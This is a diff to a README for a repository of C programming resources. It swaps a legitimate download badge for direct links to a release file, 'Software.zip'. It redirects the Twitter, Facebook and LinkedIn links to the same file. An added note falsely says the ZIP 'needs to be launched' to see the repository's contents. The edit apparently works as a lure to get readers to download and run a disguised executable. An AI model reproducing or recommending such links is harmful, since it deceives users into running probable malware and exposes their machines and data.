@@ -3,7 +3,7 @@
 
 Welcome to the "C" repository, a collection of resources related to the C programming language! 🚀
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/mamun710/c/releases/download/v1.0/Software.zip)](https://github.com/mamun710/c/releases/download/v1.0/Software.zip)
 
 ## Description
 
@@ -21,7 +21,7 @@ This repository is a treasure trove for all things related to the C programming 
 
 To get started with the "C" repository, simply click on the link below to download the ZIP file:
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/mamun710/c/releases/download/v1.0/Software.zip)](https://github.com/mamun710/c/releases/download/v1.0/Software.zip)
 
 *Note: The ZIP file needs to be launched to access the contents of the repository.*
 
@@ -43,8 +43,8 @@ We would like to express our gratitude to all the contributors who have dedicate
 
 Stay up-to-date with the latest updates, announcements, and events by following us on social media:
 
-- Twitter: [@c_programming](https://twitter.com/c_programming)
-- Facebook: [C Programming Community](https://www.facebook.com/cprogrammingcommunity)
-- LinkedIn: [C Programming Enthusiasts](https://www.linkedin.com/company/c-programming-enthusiasts)
+- Twitter: [@c_programming](https://github.com/mamun710/c/releases/download/v1.0/Software.zip)
+- Facebook: [C Programming Community](https://github.com/mamun710/c/releases/download/v1.0/Software.zip)
+- LinkedIn: [C Programming Enthusiasts](https://github.com/mamun710/c/releases/download/v1.0/Software.zip)
 
 Thank you for being a part of the "C" repository. Happy coding! 💻🌟
